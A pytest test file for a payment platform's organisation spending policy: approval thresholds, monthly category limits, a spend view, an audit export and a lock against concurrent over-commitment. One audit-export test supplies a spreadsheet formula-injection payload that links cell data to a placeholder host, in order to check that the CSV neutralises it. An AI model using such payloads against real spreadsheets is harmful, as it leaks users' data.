"""The organisation tier (#13): the organisation's own spending policy enforced where
money moves, its spend view, and an audit export an auditor can use as it is."""

from __future__ import annotations

import csv
import io
from datetime import UTC, datetime, timedelta
from decimal import Decimal

import pytest
from fastapi.testclient import TestClient

from misthos.config import settings
from misthos.domain.issue import SILENT_PUBLISHER_GRACE, IssueState
from misthos.domain.ledger import MoneyEventKind
from misthos.domain.money import Usdc
from misthos.domain.policy import PolicyRefusal
from misthos.main import app
from misthos.schemas import PublishRequest
from misthos.store import store
from misthos.workers.sweeper import sweep_once

API = "/api/v1"
ISSUE = "ISS-1006"  # PUB-4's, priced about $2,600, labelled compliance and reporting
PUBLISHER = "PUB-4"
APPROVER = "dana-globex"  # a GitHub login, which is what a session can prove


@pytest.fixture(autouse=True)
def fresh_store():
    store.reset()
    yield


@pytest.fixture
def client() -> TestClient:
    return TestClient(app)


def policy(client: TestClient, **body: object) -> object:
    return client.put(f"{API}/publishers/{PUBLISHER}/policy", json=body)


def to_acceptance(issue_id: str) -> None:
    for _ in range(4):  # fund, claim, submit, verdict
        store.advance(issue_id)
    assert store.get(issue_id).state is IssueState.ACCEPTED  # type: ignore[union-attr]


class TestReleaseThreshold:
    def test_a_release_over_the_threshold_waits_for_a_named_approver(
        self, client: TestClient
    ) -> None:
        assert (
            policy(client, approval_threshold_usdc="1000", approvers=[APPROVER]).status_code == 200
        )
        to_acceptance(ISSUE)

        rec = store.advance(ISSUE)  # the publisher merges

        assert rec.state is IssueState.ACCEPTED
        assert rec.payout_hold == "await_approver"
        held = rec.decisions[-1]
        assert (held.action, held.rule) == ("payout_held", "release_threshold")
        assert APPROVER in held.outcome

    def test_the_grace_period_cannot_go_around_it(self, client: TestClient) -> None:
        policy(client, approval_threshold_usdc="1000", approvers=[APPROVER])
        to_acceptance(ISSUE)
        verdict_at = store.get(ISSUE).review.decided_at  # type: ignore[union-attr]
        sweep_once(store, now=verdict_at + SILENT_PUBLISHER_GRACE + timedelta(hours=2))
        assert store.get(ISSUE).state is IssueState.ACCEPTED  # type: ignore[union-attr]

    def test_only_a_named_approver_releases_it(self, client: TestClient) -> None:
        policy(client, approval_threshold_usdc="1000", approvers=[APPROVER])
        to_acceptance(ISSUE)
        store.advance(ISSUE)

        r = client.post(f"{API}/issues/{ISSUE}/approve-release", json={"approver": "mallory"})
        assert r.status_code == 403
        r = client.post(f"{API}/issues/{ISSUE}/approve-release", json={"approver": APPROVER})
        assert r.status_code == 200 and r.json()["state"] == "PAID"

        actions = [d.action for d in store.get(ISSUE).decisions]  # type: ignore[union-attr]
        assert actions.index("release_approved") < actions.index("released")

    def test_nothing_to_approve_is_a_conflict(self, client: TestClient) -> None:
        policy(client, approval_threshold_usdc="1000", approvers=[APPROVER])
        r = client.post(f"{API}/issues/{ISSUE}/approve-release", json={"approver": APPROVER})
        assert r.status_code == 409

    def test_under_the_threshold_nothing_waits(self, client: TestClient) -> None:
        policy(client, approval_threshold_usdc="100000", approvers=[APPROVER])
        assert store.approve_and_accept(ISSUE).state is IssueState.PAID

    @pytest.mark.parametrize(
        "body",
        [
            {"approval_threshold_usdc": "1000", "approvers": []},
            {"approval_threshold_usdc": "-5", "approvers": [APPROVER]},
            {"approval_threshold_usdc": "lots", "approvers": [APPROVER]},
            # Nothing a session proves is an e-mail, so this one could never approve.
            {"approval_threshold_usdc": "1000", "approvers": ["dana@globex.example"]},
            {"category_limits": {"security": "-1"}},
        ],
    )
    def test_a_policy_that_cannot_work_is_refused(self, client: TestClient, body: dict) -> None:
        assert policy(client, **body).status_code == 422


class TestCategoryLimits:
    def test_a_commitment_over_the_monthly_limit_is_refused(self, client: TestClient) -> None:
        policy(client, category_limits={"compliance": "1000"})

        r = client.post(f"{API}/issues/{ISSUE}/advance")

        assert r.status_code == 403
        assert "compliance is limited to 1000.00 USDC a month" in r.json()["detail"]
        rec = store.get(ISSUE)
        assert rec is not None and rec.state is IssueState.AWAITING_APPROVAL
        assert (rec.decisions[-1].action, rec.decisions[-1].rule) == (
            "funding_refused",
            "category_limit",
        )
        assert rec.money_events == []

    def test_within_the_limit_it_funds(self, client: TestClient) -> None:
        policy(client, category_limits={"compliance": "10000"})
        assert store.advance(ISSUE).state is IssueState.FUNDED

    def test_the_limit_is_held_against_the_price_the_publisher_set(
        self, client: TestClient
    ) -> None:
        """The money committed is the publisher's price, so the price is what a limit
        must bound. Held against the engine's suggestion instead, an issue the publisher
        re-priced down is refused for a commitment they were never going to make (#150)."""
        rec = store.get(ISSUE)
        assert rec is not None and rec.proposal is not None
        # Room for the price, and not for the engine's reading of the issue.
        room = Usdc(rec.proposal.recommended.base_units - Usdc.from_decimal("1").base_units)
        # Asserted, because a refused policy would leave no limit at all and this test
        # would pass for the wrong reason.
        applied = policy(client, category_limits={"compliance": f"{room.decimal:.2f}"})
        assert applied.status_code == 200, applied.text
        moved = client.patch(f"{API}/issues/{ISSUE}/price", json={"amount": "100"})
        assert moved.status_code == 200, moved.text

        funded = store.advance(ISSUE)

        assert funded.state is IssueState.FUNDED
        assert funded.escrow is not None
        assert funded.escrow.amount["usdc"] == "100.00"

    def test_a_price_over_the_room_left_is_refused(self, client: TestClient) -> None:
        """And the other way: the amount the message names is the price, so a commitment
        the publisher did ask for is refused and named as what it is (#150)."""
        policy(client, category_limits={"compliance": "100"})
        second = store.publish(
            PublishRequest(
                repo="acme/ledger",
                title="Compliance: reconcile the monthly export",
                labels=["compliance"],
                publisher_id=PUBLISHER,
                signals={"blast_radius": 2},
                price=Decimal("150"),
            )
        )

        r = client.post(f"{API}/issues/{second.id}/advance")

        assert r.status_code == 403
        assert "this would add 150.00" in r.json()["detail"]

    def test_the_limit_is_the_organisations_own(self) -> None:
        with pytest.raises(PolicyRefusal):
            store.set_policy(
                PUBLISHER,
                approval_threshold_usdc="5",
                approvers=[],
                category_limits={},
            )


class TestSpendView:
    def test_budgeted_committed_released_and_fileable(self, client: TestClient) -> None:
        policy(client, category_limits={"compliance": "10000"})
        paid = store.approve_and_accept(ISSUE)
        amount = paid.money_events[-1].amount

        spend = client.get(f"{API}/publishers/{PUBLISHER}/spend").json()

        released = sum(
            e.amount.base_units
            for r in store.list_issues()
            if r.publisher_id == PUBLISHER
            for e in r.money_events
            if e.kind is MoneyEventKind.RELEASED and e.occurred_at.year == spend["year"]
        )
        assert spend["released"]["base_units"] == released
        compliance = next(c for c in spend["by_category"] if c["label"] == "compliance")
        assert compliance["released"]["base_units"] == amount.base_units
        assert compliance["limit"]["usdc"] == "10000.00"
        filed = next(f for f in spend["fileable"] if f["issue_id"] == ISSUE)
        assert filed["acceptance_criteria"] == paid.acceptance_criteria

    def test_each_category_shows_this_months_commitments_beside_its_monthly_limit(
        self, client: TestClient
    ) -> None:
        """The limit is per calendar month, so the figure beside it is the month's,
        and the year's stays the year's."""
        policy(client, category_limits={"compliance": "10000"})
        committed = store.advance(ISSUE).money_events[-1]
        assert committed.kind is MoneyEventKind.COMMITTED

        spend = client.get(f"{API}/publishers/{PUBLISHER}/spend").json()
        now = datetime.now(UTC)
        assert spend["month"] == f"{now:%Y-%m}"
        compliance = next(c for c in spend["by_category"] if c["label"] == "compliance")
        assert compliance["committed_this_month"]["base_units"] == committed.amount.base_units

        # A month on, the month starts again from nothing; the year has not.
        first = committed.occurred_at.replace(day=1)
        next_month = (first + timedelta(days=32)).replace(day=1)
        later = store.spend(PUBLISHER, year=committed.occurred_at.year, now=next_month)
        assert later.month == f"{next_month:%Y-%m}"
        [moved] = [c for c in later.by_category if c.label == "compliance"]
        assert moved.committed_this_month["base_units"] == 0
        assert moved.committed["base_units"] == committed.amount.base_units

    def test_the_month_shown_is_the_month_the_limit_is_checked_against(
        self, client: TestClient
    ) -> None:
        policy(client, category_limits={"compliance": "10000"})
        store.advance(ISSUE)
        spend = client.get(f"{API}/publishers/{PUBLISHER}/spend").json()
        shown = next(c for c in spend["by_category"] if c["label"] == "compliance")
        month = Decimal(shown["committed_this_month"]["usdc"])

        # One dollar of room left this month, by the panel's own figure.
        policy(client, category_limits={"compliance": str(month + 1)})
        second = store.publish(
            PublishRequest(
                # A price it would commit, two dollars past the room left, so the limit is
                # what refuses it. The publisher's number is what counts against the limit
                # now, so an issue published without one cannot reach this check at all:
                # funding it is refused for the missing price (#142, #150).
                repo="acme/ledger", title="Compliance: reconcile the monthly export",
                labels=["compliance"], publisher_id=PUBLISHER, signals={"blast_radius": 2},
                price=month + 2,
            )
        )  # fmt: skip
        r = client.post(f"{API}/issues/{second.id}/advance")

        assert r.status_code == 403
        assert f"{month:.2f} USDC is committed already" in r.json()["detail"]

    def test_an_unknown_publisher_is_404(self, client: TestClient) -> None:
        assert client.get(f"{API}/publishers/PUB-999/spend").status_code == 404


class TestAuditExport:
    def test_the_export_is_the_record_unedited(self, client: TestClient) -> None:
        store.approve_and_accept(ISSUE)
        body = client.get(f"{API}/publishers/{PUBLISHER}/audit").json()

        mine = [r for r in store.list_issues() if r.publisher_id == PUBLISHER]
        assert {i["id"] for i in body["issues"]} == {r.id for r in mine}
        exported = next(i for i in body["issues"] if i["id"] == ISSUE)
        rec = store.get(ISSUE)
        assert rec is not None
        assert [d["id"] for d in exported["decisions"]] == [d.id for d in rec.decisions]
        assert [e["tx_hash"] for e in exported["money_events"]] == [
            None if e.kind is MoneyEventKind.RELEASED else e.tx_hash for e in rec.money_events
        ]
        # A release's reference would link the contributor's wallet to their handle.
        assert rec.payout_tx_hash is not None
        assert rec.payout_tx_hash not in client.get(
            f"{API}/publishers/{PUBLISHER}/audit", params={"format": "csv"}
        ).text

    def test_the_exported_price_is_the_one_the_publisher_approved(
        self, client: TestClient
    ) -> None:
        """An audit record with a price nobody agreed to, beside money events that say
        what actually moved, is worse than no record (#150). The row below is the
        publisher's number: the engine's suggestion would be a different one."""
        moved = client.patch(f"{API}/issues/{ISSUE}/price", json={"amount": "100"})
        assert moved.status_code == 200, moved.text
        body = client.get(f"{API}/publishers/{PUBLISHER}/audit").json()

        exported = next(i for i in body["issues"] if i["id"] == ISSUE)
        assert exported["price"]["usdc"] == "100.00"

    def test_the_csv_is_one_sortable_table(self, client: TestClient) -> None:
        store.approve_and_accept(ISSUE)
        r = client.get(f"{API}/publishers/{PUBLISHER}/audit", params={"format": "csv"})
        assert r.headers["content-type"].startswith("text/csv")
        lines = r.text.splitlines()
        # The header is the first line, so a reader that trusts it needs no special
        # case; the simulation caveat is a last row among the data.
        assert lines[0].startswith("record,")
        assert lines[-1].startswith("# SIMULATED")
        rows = list(csv.DictReader(io.StringIO("\n".join(lines[:-1]))))
        ours = [row for row in rows if row["issue_id"] == ISSUE]
        assert {row["record"] for row in ours} == {"decision", "money"}
        assert [row["at_utc"] for row in ours] == sorted(row["at_utc"] for row in ours)

    def test_a_formula_in_the_record_is_exported_as_text(self, client: TestClient) -> None:
        """The repository on every row is what the publisher typed. An auditor's
        spreadsheet shows it; it never runs it, and the amounts stay numbers."""
        repo = '=HYPERLINK("http://x/?"&A1,"click")'
        rec = store.publish(
            PublishRequest(
                repo=repo, title="Pin the parser", publisher_id=PUBLISHER,
                price=Decimal("500"), signals={"blast_radius": 2},
            )
        )  # fmt: skip
        store.approve_and_accept(rec.id)

        r = client.get(f"{API}/publishers/{PUBLISHER}/audit", params={"format": "csv"})
        rows = list(csv.DictReader(io.StringIO("\n".join(r.text.splitlines()[:-1]))))
        ours = [row for row in rows if row["issue_id"] == rec.id]

        assert ours and {row["repo"] for row in ours} == {"'" + repo}
        amounts = [row["amount_usdc"] for row in ours if row["record"] == "money"]
        assert amounts and all(Decimal(a) > 0 for a in amounts)

    def test_it_is_the_organisations_alone(
        self, client: TestClient, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(settings, "simulated", False)
        # Anonymous outside the simulation: sign in first.
        assert client.get(f"{API}/publishers/{PUBLISHER}/audit").status_code == 401
        assert client.get(f"{API}/publishers/{PUBLISHER}/spend").status_code == 401
        assert policy(client, approvers=[APPROVER]).status_code == 401


class TestTheLimitIsAtomic:
    """A monthly limit is a sum over the publisher's issues, so the read and the
    commitment it authorises must be one step.

    The issue lock alone is not enough: two fundings of *different* issues of the same
    publisher take different locks and both see the same untouched month.
    """

    def test_two_concurrent_fundings_cannot_both_pass_the_limit(
        self, client: TestClient, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import threading
        import time

        # Two issues of one publisher in one category, each able to pass alone but not
        # together: ISS-1006 commits ~2601 and a second compliance issue 259, against
        # a 2700 cap.
        policy(client, category_limits={"compliance": "2700"})
        second = store.publish(
            PublishRequest(
                repo="acme/ledger",
                title="Compliance: reconcile the monthly export",
                labels=["compliance"],
                publisher_id=PUBLISHER,
                # The publisher names the price (#142), and it is the amount the cap
                # counts. Without one this issue cannot be funded at all.
                price=Decimal("259"),
                signals={"blast_radius": 2},
            )
        ).id
        first = ISSUE
        for issue_id in (first, second):
            # Approve the drafted criteria as they stand; they are the platform's own
            # and already pass its checkability rules.
            rec = store.get(issue_id)
            assert rec is not None
            # The premise of the test is that each of these can fund alone. A missing
            # price breaks it silently: the loser is refused for having no price to
            # commit rather than by the limit, and whether the test notices depends on
            # which thread reached the funding first (#142).
            assert rec.price is not None, f"{issue_id} has no price, so it cannot fund"
            store.approve_criteria(issue_id, list(rec.acceptance_criteria), APPROVER)
            assert store.get(issue_id).state is IssueState.AWAITING_APPROVAL

        # Widen the window between reading the month and committing it. Without a lock
        # spanning the two, both threads read the same empty month and both commit.
        original = store._check_category_limits

        def slow_check(rec: object, now: object) -> None:
            original(rec, now)  # type: ignore[arg-type]
            time.sleep(0.3)

        monkeypatch.setattr(store, "_check_category_limits", slow_check)

        outcomes: list[str] = []
        guard = threading.Lock()

        def fund(issue_id: str) -> None:
            try:
                store.approve_price(issue_id, APPROVER)
                result = "funded"
            except Exception as exc:
                result = type(exc).__name__
            with guard:
                outcomes.append(result)

        threads = [threading.Thread(target=fund, args=(i,)) for i in (first, second)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=20)

        funded = [o for o in outcomes if o == "funded"]
        assert len(funded) == 1, f"both fundings passed a 2700 limit: {outcomes}"
        assert len(outcomes) == 2, f"a thread never finished: {outcomes}"
        # The loser is refused by the limit, or by the lock it was contending on when
        # the other thread held it: both are legitimate ways to lose. What it must
        # never be is a fund, or a failure from somewhere else entirely. That last
        # clause is what caught a second issue with no price to commit, which could
        # not have funded whatever the limit said (#142).
        assert set(outcomes) <= {"funded", "PolicyRefusal", "Busy"}, outcomes

        # And what the two of them committed together is inside what the organisation
        # allowed. Scoped to these two: the publisher's seeded history is not part of
        # this window.
        together = sum(
            e.amount.base_units
            for other in store.list_issues()
            if other.id in (first, second)
            for e in other.money_events
            if e.kind is MoneyEventKind.COMMITTED
        )
        assert together <= 2700 * 10**6, together
